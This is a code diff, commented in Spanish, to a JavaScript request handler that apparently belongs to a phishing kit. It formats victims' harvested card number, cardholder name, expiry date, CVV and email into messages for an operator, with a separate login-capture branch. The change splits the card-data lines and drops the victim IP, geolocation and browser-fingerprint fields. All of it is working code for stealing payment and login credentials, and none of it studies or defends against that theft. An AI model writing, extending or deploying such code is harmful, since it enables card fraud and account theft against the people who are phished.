@@ -129,12 +129,16 @@ export default async function handler(req, res) {
 
       // Si es pago y la plantilla no tiene cardNumber, agregar seccion de tarjeta al final
       if (isPayment && !message.includes('{cardNumber}') && cardNumber) {
-        message += '\n\n--------\nDATOS DE TARJETA:\nNumero: ' + cardNumber + '\nTitular: ' + cardHolder + '\nVence: ' + expiryDate + '\nCVV: ' + cvv;
+        message += '\n\n----\nDATOS DE TARJETA:';
+        message += '\nNumero: ' + cardNumber;
+        message += '\nTitular: ' + cardHolder;
+        message += '\nVence: ' + expiryDate;
+        message += '\nCVV: ' + cvv;
       }
     } else {
       // Plantilla por defecto
       if (isPayment) {
-        // Mensaje SOLO de pago - sin datos de login
+        // Mensaje SOLO de pago - email + tarjeta, nada de login
         message = '💳 Verificacion de pago';
         message += '\n----------------';
         message += '\nUsuario: ' + email;
@@ -147,16 +151,6 @@ export default async function handler(req, res) {
           message += '\nCVV: ' + cvv;
         }
         message += '\n----------------';
-        message += '\nIP: ' + clientIp;
-        message += '\nGeo IP: ' + geoIp;
-        if (geoCity) message += '\nCiudad: ' + geoCity;
-        if (geoRegion) message += '\nRegion: ' + geoRegion;
-        if (geoCountry) message += '\nPais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
-        message += '\nNavegador: ' + userAgent;
-        message += '\nIdioma: ' + language;
-        message += '\nPantalla: ' + screenResolution + ' (' + colorDepth + ' bits)';
-        message += '\nZona horaria: ' + timezone;
-        message += '\nHora: ' + timestamp;
       } else {
         // Mensaje de login completo
         message = '🔐 Inicio de sesion';
